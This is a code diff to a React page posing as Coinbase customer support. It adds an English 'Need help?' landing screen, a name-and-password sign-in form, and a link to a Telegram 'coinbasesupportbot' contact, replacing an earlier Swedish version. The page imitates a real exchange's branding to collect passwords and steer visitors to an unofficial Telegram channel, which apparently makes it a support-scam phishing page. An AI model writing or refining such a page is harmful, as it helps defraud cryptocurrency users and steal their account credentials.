@@ -2,11 +2,12 @@ import React, { useState } from "react";
 import ReactDOM from "react-dom/client";
 
 function App() {
+  const [showLogin, setShowLogin] = useState(false);
+  const [loggedIn, setLoggedIn] = useState(false);
   const [name, setName] = useState("");
   const [password, setPassword] = useState("");
   const [email, setEmail] = useState("");
   const [message, setMessage] = useState("");
-  const [loggedIn, setLoggedIn] = useState(false);
   const [sent, setSent] = useState(false);
 
   const handleLogin = () => {
@@ -30,30 +31,36 @@ function App() {
 
   return (
     <div style={wrapper}>
-      <div style={box}>
-        <img src="https://cryptologos.cc/logos/coinbase-coinbase-logo.png?v=026" alt="Coinbase Logo"
-          style={{ width: 70, height: 70, filter: 'brightness(0) invert(1)', marginBottom: 20 }} />
-        {!loggedIn ? (
-          <>
-            <h2 style={{ marginBottom: 20 }}>Logga in till support</h2>
-            <input style={inputStyle} placeholder="Ditt namn" value={name} onChange={(e) => setName(e.target.value)} />
-            <input type="password" style={inputStyle} placeholder="Lösenord" value={password} onChange={(e) => setPassword(e.target.value)} />
-            <button style={buttonStyle} onClick={handleLogin}>Logga in</button>
-          </>
-        ) : (
-          <>
-            <h2>Välkommen, {name}</h2>
-            <a href="https://t.me/coinbasesupportbot" target="_blank" rel="noreferrer" style={linkButton}>
-              💬 Kontakta oss via Telegram
-            </a>
-            <p style={{ marginTop: 30 }}>Eller skicka ett meddelande via e-post:</p>
-            <input style={inputStyle} placeholder="Din e-post" value={email} onChange={(e) => setEmail(e.target.value)} />
-            <textarea rows="4" style={{ ...inputStyle, height: "100px" }} placeholder="Meddelande" value={message} onChange={(e) => setMessage(e.target.value)} />
-            <button style={buttonStyle} onClick={sendEmail}>📨 Skicka meddelande</button>
-            {sent && <p style={{ color: "lightgreen", marginTop: 10 }}>✅ Meddelandet skickades!</p>}
-          </>
-        )}
-      </div>
+      {!showLogin ? (
+        <div style={heroBox}>
+          <h1 style={{ fontSize: "32px", marginBottom: 10 }}>Need help?</h1>
+          <p style={{ marginBottom: 30, fontSize: "16px", color: "#cbd5e1" }}>
+            We're here to help you with anything related to your Coinbase account.
+          </p>
+          <button style={buttonStyle} onClick={() => setShowLogin(true)}>
+            Sign in to speak with us
+          </button>
+        </div>
+      ) : !loggedIn ? (
+        <div style={box}>
+          <h2 style={{ marginBottom: 20 }}>Log in to Support</h2>
+          <input style={inputStyle} placeholder="Your name" value={name} onChange={(e) => setName(e.target.value)} />
+          <input type="password" style={inputStyle} placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
+          <button style={buttonStyle} onClick={handleLogin}>Log in</button>
+        </div>
+      ) : (
+        <div style={box}>
+          <h2>Welcome, {name}</h2>
+          <a href="https://t.me/coinbasesupportbot" target="_blank" rel="noreferrer" style={linkButton}>
+            💬 Contact us via Telegram
+          </a>
+          <p style={{ marginTop: 30 }}>Or send us a message via email:</p>
+          <input style={inputStyle} placeholder="Your email" value={email} onChange={(e) => setEmail(e.target.value)} />
+          <textarea rows="4" style={{ ...inputStyle, height: "100px" }} placeholder="Message" value={message} onChange={(e) => setMessage(e.target.value)} />
+          <button style={buttonStyle} onClick={sendEmail}>📨 Send Message</button>
+          {sent && <p style={{ color: "lightgreen", marginTop: 10 }}>✅ Message sent!</p>}
+        </div>
+      )}
     </div>
   );
 }
@@ -63,7 +70,13 @@ const wrapper = {
   alignItems: 'center',
   justifyContent: 'center',
   minHeight: '100vh',
-  backgroundColor: '#0a0f1c'
+  backgroundColor: '#0a0f1c',
+  textAlign: 'center',
+  padding: 20
+};
+
+const heroBox = {
+  maxWidth: 500
 };
 
 const box = {
